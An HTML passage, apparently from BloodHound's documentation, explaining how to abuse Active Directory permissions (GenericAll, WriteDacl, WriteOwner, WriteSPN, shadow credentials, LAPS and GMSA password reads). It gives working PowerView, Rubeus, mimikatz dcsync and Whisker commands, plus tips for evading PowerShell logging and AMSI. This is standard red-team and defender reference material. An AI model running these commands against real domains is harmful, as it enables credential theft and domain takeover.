<p>Full control of a group allows you to directly modify group membership of the group. For full abuse
info in that scenario, see the Abuse Info section under the AddMembers edge</p>
<p><strong>With GenericAll Over a User:</strong></p>
<p><strong>Targeted Kerberoast</strong>
A targeted kerberoast attack can be performed using PowerView’s Set-DomainObject along with
Get-DomainSPNTicket.</p>
<p>You may need to authenticate to the Domain Controller as the user with full control over the target
user if you are not running a process as that user. To do this in conjunction with Set-DomainObject,
first create a PSCredential object (these examples comes from the PowerView help documentation):</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$SecPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential(&#39;TESTLAB\\dfm.a&#39;, $SecPassword)
</pre></div>
</div>
<p>Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as
the user with full control over the target user.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname=&#39;nonexistent/BLAHBLAH&#39;}
</pre></div>
</div>
<p>After running this, you can use Get-DomainSPNTicket as follows:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Get-DomainSPNTicket -Credential $Cred harmj0y | fl
</pre></div>
</div>
<p>The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName
can be done with the Set-DomainObject command:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname
</pre></div>
</div>
<p><strong>Force Change Password</strong></p>
<p>You can also reset user passwords with full control over user objects. For full abuse info about this attack,
see the information under the ForceChangePassword edge</p>
<p><strong>With GenericAll Over a Computer</strong></p>
<p>Full control of a computer object is abusable when the computer’s local admin account credential is
controlled with LAPS. The clear-text password for the local administrator account is stored in an extended
attribute on the computer object called ms-Mcs-AdmPwd. With full control of the computer object, you may
have the ability to read this attribute, or grant yourself the ability to read the attribute by modifying
the computer object’s security descriptor.</p>
<p>Alternatively, Full control of a computer object can be used to perform a resource based constrained
delegation attack.</p>
<p>Abusing this primitive is currently only possible through the Rubeus project.</p>
<p>First, if an attacker does not control an account with an SPN set, Kevin Robertson’s Powermad project can
be used to add a new attacker-controlled computer account:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString &#39;Summer2018!&#39; -AsPlainText -Force)
</pre></div>
</div>
<p>PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
</pre></div>
</div>
<p>We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the
binary bytes for the new DACL/ACE:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))&quot;
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
</pre></div>
</div>
<p>Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity
field of the computer account we’re taking over, again using PowerView in this case:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes}
</pre></div>
</div>
<p>We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Rubeus.exe hash /password:Summer2018!
</pre></div>
</div>
<p>And finally we can use Rubeus’ <em>s4u</em> module to get a service ticket for the service name (sname) we
want to “pretend” to be “admin” for. This ticket is injected (thanks to /ptt), and in this case grants
us access to the file system of the TARGETCOMPUTER:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt
</pre></div>
</div>
<p><strong>With GenericAll Over a Domain Object</strong></p>
<p>Full control of a domain object grants you both DS-Replication-Get-Changes as well as DS-Replication-Get-Changes-All
rights. The combination of these rights allows you to perform the dcsync attack using mimikatz. To grab the
credential of the user harmj0y using these rights:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="n">testlab</span><span class="o">.</span><span class="n">local</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="n">harmj0y</span>
</pre></div>
</div>
<p>See a video walk through of how to execute this attack here:</p>
<div style="text-align: center; margin-bottom: 2em;">
<iframe width="100%" height="350" src="https://www.youtube.com/embed/RUbADHcBLKg?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div><p><strong>With GenericAll Over a GPO</strong></p>
<p>With full control of a GPO, you may make modifications to that GPO which will then apply to the users and
computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use
the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new
immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute
the new evil policy. See the references tab for a more detailed write up on this abuse</p>
<p><strong>With GenericAll Over an OU</strong></p>
<p>With full control of an OU, you may add a new ACE on the OU that will inherit down to the objects under that
OU. Below are two options depending on how targeted you choose to be in this step:</p>
<p>Generic Descendent Object Takeover:</p>
<p>The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU
that will inherit down to all object types. Again, this can be done using PowerView. This time we will use
the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU.</p>
<p>First, we need to reference the OU by its ObjectGUID, not its name. You can find the ObjectGUID for the OU
in the BloodHound GUI by clicking the OU, then inspecting the <em>objectid</em> value</p>
<p>Next, we will fetch the GUID for all objects. This should be ‘00000000-0000-0000-0000-000000000000’:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq &#39;All&#39;} | select -ExpandProperty name
</pre></div>
</div>
<p>Then we will construct our ACE. This command will create an ACE granting the “JKHOLER” user full control of
all descendant objects:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity &#39;JKOHLER&#39; -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid
</pre></div>
</div>
<p>Finally, we will apply this ACE to our target OU:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$OU = Get-DomainOU -Raw (OU GUID)
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = &#39;Dacl&#39;
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()
</pre></div>
</div>
<p>Now, the “JKOHLER” user will have full control of all descendent objects of each type.</p>
<p>Targeted Descendent Object Takeoever:</p>
<p>If you want to be more targeted with your approach, it is possible to specify precisely what right you want
to apply to precisely which kinds of descendent objects. You could, for example, grant a user
“ForceChangePassword” privilege against all user objects, or grant a security group the ability to read every
GMSA password under a certain OU. Below is an example taken from PowerView’s help text on how to grant the
“ITADMIN” user the ability to read the LAPS password from all computer objects in the “Workstations” OU:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$Guids = Get-DomainGUIDMap
$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq &#39;ms-Mcs-AdmPwd&#39;} | select -ExpandProperty name
$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq &#39;Computer&#39;} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
$OU = Get-DomainOU -Raw Workstations
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = &#39;Dacl&#39;
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()
</pre></div>
</div>
</section>
<section id="id41">
<h3>Opsec Considerations<a class="headerlink" href="#id41" title="Link to this heading"></a></h3>
</section>
<section id="id42">
<h3>References<a class="headerlink" href="#id42" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p></li>
<li><p><a class="reference external" href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a></p></li>
<li><p><a class="reference external" href="https://adsecurity.org/?p=1729">https://adsecurity.org/?p=1729</a></p></li>
<li><p><a class="reference external" href="https://blog.harmj0y.net/activedirectory/targeted-kerberoasting/">https://blog.harmj0y.net/activedirectory/targeted-kerberoasting/</a></p></li>
<li><p><a class="reference external" href="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e">https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e</a></p></li>
<li><p><a class="reference external" href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html">https://eladshamir.com/2019/01/28/Wagging-the-Dog.html</a></p></li>
<li><p><a class="reference external" href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a></p></li>
<li><p><a class="reference external" href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff</a></p></li>
<li><p><a class="reference external" href="https://blog.harmj0y.net/redteaming/another-word-on-delegation/">https://blog.harmj0y.net/redteaming/another-word-on-delegation/</a></p></li>
<li><p><a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p></li>
<li><p><a class="reference external" href="https://github.com/Kevin-Robertson/Powermad#new-machineaccount">https://github.com/Kevin-Robertson/Powermad#new-machineaccount</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="writedacl">
<h2>WriteDacl<a class="headerlink" href="#writedacl" title="Link to this heading"></a></h2>
<p>With write access to the target object’s DACL, you can grant yourself any privilege you want
on the object.</p>
<section id="id43">
<h3>Abuse Info<a class="headerlink" href="#id43" title="Link to this heading"></a></h3>
<p>With the ability to modify the DACL on the target object, you can grant yourself almost any
privilege against the object you wish.</p>
<p><strong>Groups</strong></p>
<p>With WriteDACL over a group, grant yourself the right to add members to the group:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Add</span><span class="o">-</span><span class="n">DomainObjectAcl</span> <span class="o">-</span><span class="n">TargetIdentity</span> <span class="s2">&quot;Domain Admins&quot;</span> <span class="o">-</span><span class="n">Rights</span> <span class="n">WriteMembers</span>
</pre></div>
</div>
<p>See the abuse info for AddMembers edge for more information about execution the attack from
there.</p>
<p><strong>Users</strong></p>
<p>With WriteDACL over a user, grant yourself full control of the user object:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Add</span><span class="o">-</span><span class="n">DomainObjectAcl</span> <span class="o">-</span><span class="n">TargetIdentity</span> <span class="n">harmj0y</span> <span class="o">-</span><span class="n">Rights</span> <span class="n">All</span>
</pre></div>
</div>
<p>See the abuse info for ForceChangePassword and GenericAll over a user for more infromation
about how to continue from there.</p>
<p><strong>Computers</strong></p>
<p>With WriteDACL over a computer object, grant yourself full control of the computer
object:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Add</span><span class="o">-</span><span class="n">DomainObjectAcl</span> <span class="o">-</span><span class="n">TargetIdentity</span> <span class="n">windows1</span> <span class="o">-</span><span class="n">Rights</span> <span class="n">All</span>
</pre></div>
</div>
<p>Then either read the LAPS password attribute for the computer or perform resource-based
constrained delegation against the target computer.</p>
<p><strong>Domains</strong></p>
<p>With WriteDACL against a domain object, grant yourself the ability to DCSync:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Add</span><span class="o">-</span><span class="n">DomainObjectAcl</span> <span class="o">-</span><span class="n">TargetIdentity</span> <span class="n">testlab</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">Rights</span> <span class="n">DCSync</span>
</pre></div>
</div>
<p>Then perform the DCSync attack.</p>
<p><strong>GPOs</strong></p>
<p>With WriteDACL over a GPO, grant yourself full control of the GPO:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Add</span><span class="o">-</span><span class="n">DomainObjectAcl</span> <span class="o">-</span><span class="n">TargetIdentity</span> <span class="n">TestGPO</span> <span class="o">-</span><span class="n">Rights</span> <span class="n">All</span>
</pre></div>
</div>
<p>Then edit the GPO to take over an object the GPO applies to.</p>
<p><strong>OUs</strong></p>
<p>With WriteDACL over an OU, grant yourself full control of the OU:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Add</span><span class="o">-</span><span class="n">DomainObjectAcl</span> <span class="o">-</span><span class="n">TargetIdentity</span> <span class="p">(</span><span class="n">OU</span> <span class="n">GUID</span><span class="p">)</span> <span class="o">-</span><span class="n">Rights</span> <span class="n">All</span>
</pre></div>
</div>
<p>Then add a new ACE to the OU that inherits down to child objects to take over
those child objects.</p>
</section>
<section id="id44">
<h3>Opsec Considerations<a class="headerlink" href="#id44" title="Link to this heading"></a></h3>
<p>When using the PowerView functions, keep in mind that PowerShell v5 introduced several security
mechanisms that make it much easier for defenders to see what’s going on with PowerShell in their
network, such as script block logging and AMSI. You can bypass those security mechanisms by
downgrading to PowerShell v2, which all PowerView functions support.</p>
<p>Modifying permissions on an object will generate 4670 and 4662 events on the domain controller
that handled the request.</p>
<p>Additional opsec considerations depend on the target object and how to take advantage of this
privilege.</p>
</section>
<section id="id45">
<h3>References<a class="headerlink" href="#id45" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p></li>
<li><p><a class="reference external" href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a></p></li>
<li><p><a class="reference external" href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html">https://eladshamir.com/2019/01/28/Wagging-the-Dog.html</a></p></li>
<li><p><a class="reference external" href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a></p></li>
<li><p><a class="reference external" href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff</a></p></li>
<li><p><a class="reference external" href="https://blog.harmj0y.net/redteaming/another-word-on-delegation/">https://blog.harmj0y.net/redteaming/another-word-on-delegation/</a></p></li>
<li><p><a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p></li>
<li><p><a class="reference external" href="https://github.com/Kevin-Robertson/Powermad#new-machineaccount">https://github.com/Kevin-Robertson/Powermad#new-machineaccount</a></p></li>
<li><p><a class="reference external" href="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectorysecurityinheritance?view=netframework-4.8">https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectorysecurityinheritance?view=netframework-4.8</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="genericwrite">
<h2>GenericWrite<a class="headerlink" href="#genericwrite" title="Link to this heading"></a></h2>
<p>Generic Write access grants you the ability to write to any non-protected attribute on the target
object, including “members” for a group, and “serviceprincipalnames” for a user</p>
<section id="id46">
<h3>Abuse Info<a class="headerlink" href="#id46" title="Link to this heading"></a></h3>
<p><strong>Users</strong></p>
<p>With GenericWrite over a user, perform a targeted kerberoasting attack. See the abuse section
under the GenericAll edge for more information</p>
<p><strong>Groups</strong></p>
<p>With GenericWrite over a group, add yourself or another principal you control to the group.
See the abuse info under the AddMembers edge for more information</p>
<p><strong>Computers</strong></p>
<p>With GenericWrite over a computer, perform resource-based constrained delegation against the
computer. See the GenericAll edge abuse info for more information about that attack.</p>
<p><strong>GPO</strong></p>
<p>With GenericWrite on a GPO, you may make modifications
to that GPO which will then apply to the users and
computers affected by the GPO. Select the target object
you wish to push an evil policy down to, then use the
gpedit GUI to modify the GPO, using an evil policy that
allows item-level targeting, such as a new immediate
scheduled task. Then wait for the group
policy client to pick up and execute the new evil
policy. See the references tab for a more detailed write
up on this abuse.</p>
<p>This edge can be a false positive in rare scenarios. If you have
GenericWrite on the GPO with ‘This object only’ (no inheritance)
and no other permissions in the ACL, it is not possible to add or
modify settings of the GPO. The GPO’s settings are stored in
SYSVOL under a folder for the given GPO. Therefore, you need write
access to child objects of this folder or create child objects
permission. The security descriptor of the GPO is reflected on
the folder, meaning permissions to write child items on the GPO
are required.</p>
</section>
<section id="id47">
<h3>Opsec Considerations<a class="headerlink" href="#id47" title="Link to this heading"></a></h3>
<p>This will depend on which type of object you are targetting and the attack you perform. See
the relevant edge for opsec considerations for the actual attack you perform.</p>
</section>
<section id="id48">
<h3>References<a class="headerlink" href="#id48" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a></p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="writeowner">
<h2>WriteOwner<a class="headerlink" href="#writeowner" title="Link to this heading"></a></h2>
<p>Object owners retain the ability to modify object security descriptors, regardless of
permissions on the object’s DACL.</p>
<p>This clip shows an example of abusing this edge:</p>
<div style="text-align: center; margin-bottom: 2em;">
<iframe width="100%" height="350" src="https://www.youtube.com/embed/fqYoOoghqdE?t=1619?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div><section id="id49">
<h3>Abuse Info<a class="headerlink" href="#id49" title="Link to this heading"></a></h3>
<p>To change the ownership of the object, you may use the Set-DomainObjectOwner function in
PowerView.</p>
<p>To abuse this privilege with PowerView’s Set-DomainObjectOwner, first import PowerView
into your agent session or into a PowerShell instance at the console. You may need to
authenticate to the Domain Controller as the user with the password reset privilege if
you are not running a process as that user.</p>
<p>To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object
(these examples comes from the PowerView help documentation):</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$SecPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential(&#39;TESTLAB\\dfm.a&#39;, $SecPassword)
</pre></div>
</div>
<p>Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already
running a process as the user with this privilege:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Set-DomainObjectOwner -Credential $Cred -TargetIdentity &quot;Domain Admins&quot; -OwnerIdentity harmj0y
</pre></div>
</div>
<p>Now, with ownership of the object, you may modify the DACL of the object however you wish.
For more information about that, see the WriteDacl edge section.</p>
</section>
<section id="id50">
<h3>Opsec Considerations<a class="headerlink" href="#id50" title="Link to this heading"></a></h3>
<p>This depends on the target object and how to take advantage of this privilege.</p>
<p>When using the PowerView functions, keep in mind that PowerShell v5 introduced several security
mechanisms that make it much easier for defenders to see what’s going on with PowerShell in
their network, such as script block logging and AMSI. You can bypass those security mechanisms
by downgrading to PowerShell v2, which all PowerView functions support.</p>
<p>Modifying permissions on an object will generate 4670 and 4662 events on the domain controller
that handled the request.</p>
</section>
<section id="id51">
<h3>References<a class="headerlink" href="#id51" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a></p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="writespn">
<h2>WriteSPN<a class="headerlink" href="#writespn" title="Link to this heading"></a></h2>
<p>The ability to write directly to the servicePrincipalNames attribute on a user object.
Writing to this property gives you the opportunity to perform a targeted kerberoasting
attack against that user.</p>
<section id="id52">
<h3>Abuse Info<a class="headerlink" href="#id52" title="Link to this heading"></a></h3>
<p>A targeted kerberoast attack can be performed using PowerView’s Set-DomainObject along with
Get-DomainSPNTicket.</p>
<p>You may need to authenticate to the Domain Controller as the user with full control over the target
user if you are not running a process as that user. To do this in conjunction with Set-DomainObject,
first create a PSCredential object (these examples comes from the PowerView help documentation):</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$SecPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential(&#39;TESTLAB\\dfm.a&#39;, $SecPassword)
</pre></div>
</div>
<p>Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as
the user with full control over the target user.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname=&#39;nonexistent/BLAHBLAH&#39;}
</pre></div>
</div>
<p>After running this, you can use Get-DomainSPNTicket as follows:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Get-DomainSPNTicket -Credential $Cred harmj0y | fl
</pre></div>
</div>
<p>The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName
can be done with the Set-DomainObject command:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname
</pre></div>
</div>
</section>
<section id="id53">
<h3>Opsec Considerations<a class="headerlink" href="#id53" title="Link to this heading"></a></h3>
<p>Modifying the servicePrincipalName attribute will not, by default, generate an event on the Domain Controller.
Your target may have configured logging on users to generate 5136 events whenever a directory service is
modified, but this configuration is very rare.</p>
</section>
<section id="id54">
<h3>References<a class="headerlink" href="#id54" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://www.harmj0y.net/redteaming/kerberoasting-revisited/">https://www.harmj0y.net/redteaming/kerberoasting-revisited/</a></p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="owns">
<h2>Owns<a class="headerlink" href="#owns" title="Link to this heading"></a></h2>
<p>Object owners retain the ability to modify object security descriptors, regardless of permissions
on the object’s DACL</p>
<p>This clip shows an example of abusing object ownership:</p>
<div style="text-align: center; margin-bottom: 2em;">
<iframe width="100%" height="350" src="https://www.youtube.com/embed/fqYoOoghqdE?t=1619?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div><section id="id55">
<h3>Abuse Info<a class="headerlink" href="#id55" title="Link to this heading"></a></h3>
<p>With ownership of the object, you may modify the DACL of the object however you wish.
For more information about that, see the WriteDacl edge section.</p>
</section>
<section id="id56">
<h3>Opsec Considerations<a class="headerlink" href="#id56" title="Link to this heading"></a></h3>
<p>This depends on the target object and how to take advantage of this privilege.</p>
<p>When using the PowerView functions, keep in mind that PowerShell v5 introduced several security
mechanisms that make it much easier for defenders to see what’s going on with PowerShell in
their network, such as script block logging and AMSI. You can bypass those security mechanisms
by downgrading to PowerShell v2, which all PowerView functions support.</p>
<p>Modifying permissions on an object will generate 4670 and 4662 events on the domain controller
that handled the request.</p>
</section>
<section id="id57">
<h3>References<a class="headerlink" href="#id57" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a></p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="addkeycredentiallink">
<h2>AddKeyCredentialLink<a class="headerlink" href="#addkeycredentiallink" title="Link to this heading"></a></h2>
<p>The ability to write to the “msds-KeyCredentialLink” property on a user or computer.
Writing to this property allows an attacker to create “Shadow Credentials” on the
object and authenticate as the principal using kerberos PKINIT.</p>
<section id="id58">
<h3>Abuse Info<a class="headerlink" href="#id58" title="Link to this heading"></a></h3>
<p>To abuse this privilege, use Whisker:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Whisker</span><span class="o">.</span><span class="n">exe</span> <span class="n">add</span> <span class="o">/</span><span class="n">target</span><span class="p">:</span><span class="o">&lt;</span><span class="n">TargetPrincipal</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>For other optional parameters, view the Whisker documentation.</p>
</section>
<section id="id59">
<h3>Opsec Considerations<a class="headerlink" href="#id59" title="Link to this heading"></a></h3>
<p>Executing the attack will generate a 5136 (A directory object was modified) event
at the domain controller if an appropriate SACL is in place on the target object.</p>
<p>If PKINIT is not common in the environment, a 4768 (Kerberos authentication ticket
(TGT) was requested) ticket can also expose the attacker.</p>
</section>
<section id="id60">
<h3>References<a class="headerlink" href="#id60" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab</a></p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="readlapspassword">
<h2>ReadLAPSPassword<a class="headerlink" href="#readlapspassword" title="Link to this heading"></a></h2>
<p>This privilege allows you to read the LAPS password from a computer</p>
<section id="id61">
<h3>Abuse Info<a class="headerlink" href="#id61" title="Link to this heading"></a></h3>
<p>You may need to authenticate to the Domain Controller as the user with full control over the target
user if you are not running a process as that user. To do this in conjunction with Get-DomainObject,
first create a PSCredential object (these examples comes from the PowerView help documentation):</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$SecPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential(&#39;TESTLAB\\dfm.a&#39;, $SecPassword)
</pre></div>
</div>
<p>Then, use Get-DomainObject, optionally specifying $Cred if you are not already running a process as
the user with full control over the target user.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Get-DomainObject -Credential $Cred -Identity windows10 -Properties &quot;ms-mcs-AdmPwd&quot;,name
</pre></div>
</div>
</section>
<section id="id62">
<h3>Opsec Considerations<a class="headerlink" href="#id62" title="Link to this heading"></a></h3>
<p>Reading properties from LDAP is extremely low risk, and can only be found using monitoring of LDAP queries.</p>
</section>
<section id="id63">
<h3>References<a class="headerlink" href="#id63" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf">https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf</a></p></li>
<li><p><a class="reference external" href="https://adsecurity.org/?p=3164">https://adsecurity.org/?p=3164</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="readgmsapassword">
<h2>ReadGMSAPassword<a class="headerlink" href="#readgmsapassword" title="Link to this heading"></a></h2>
<p>This privilege allows you to read the password for a Group Managed Service Account (GMSA).
Group Managed Service Accounts are a special type of Active Directory object, where the password
for that object is mananaged by and automatically changed by Domain Controllers on a set interval
(check the MSDS-ManagedPasswordInterval attribute).</p>
<p>The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA,
then run local services as the GMSA. An attacker with control of an authorized principal may abuse that
privilege to impersonate the GMSA.`;</p>
<section id="id64">
<h3>Abuse Info<a class="headerlink" href="#id64" title="Link to this heading"></a></h3>
<p>There are several ways to abuse the ability to read the GMSA password.
The most straight forward abuse is possible when the GMSA is currently logged on to a computer, which is the intended behavior for a GMSA.</p>
<p>If the GMSA is logged on to the computer account which is granted the ability to retrieve the GMSA’s password,
simply steal the token from the process running as the GMSA, or inject into that process.</p>
<p>If the GMSA is not logged onto the computer, you may create a scheduled task or service set to run as the GMSA.
The computer account will start the sheduled task or service as the GMSA, and then you may abuse the GMSA
logon in the same fashion you would a standard user running processes on the machine (see the “HasSession” help modal for more details).
Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its equivalent NT hash,
then perform overpass-the-hash to retrieve a Kerberos ticket for the GMSA:</p>
<ol class="arabic simple">
<li><p>Build GMSAPasswordReader.exe from its source: <a class="reference external" href="https://github.com/rvazarkar/GMSAPasswordReader">https://github.com/rvazarkar/GMSAPasswordReader</a></p></li>
<li><p>Drop GMSAPasswordReader.exe to disk. If using Cobalt Strike, load and run this binary using execute-assembly</p></li>
</ol>
<p>3. Use GMSAPasswordReader.exe to retrieve the NT hash for the GMSA. You may have more than one NT hash come back, one for the
“old” password and one for the “current” password. It is possible that either value is valid:</p>
